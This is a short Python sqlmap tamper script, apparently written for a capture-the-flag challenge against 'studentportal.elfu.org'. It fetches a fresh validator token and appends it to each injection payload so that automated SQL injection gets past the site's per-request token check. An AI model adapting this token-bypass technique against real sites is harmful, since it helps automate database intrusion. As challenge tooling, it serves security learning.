#!/usr/bin/python3

# One could say this was borrowed from https://gist.github.com/MarkBaggett/49aca627205aebaa2be1811511dbc422

from lib.core.data import kb
from lib.core.enums import PRIORITY

import requests
import urllib

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    token = urllib.quote_plus(requests.get('https://studentportal.elfu.org/validator.php').text)
    new_url = urllib.quote_plus(payload)+"&token="+token
    new_url = new_url.encode("utf-8")
    return new_url

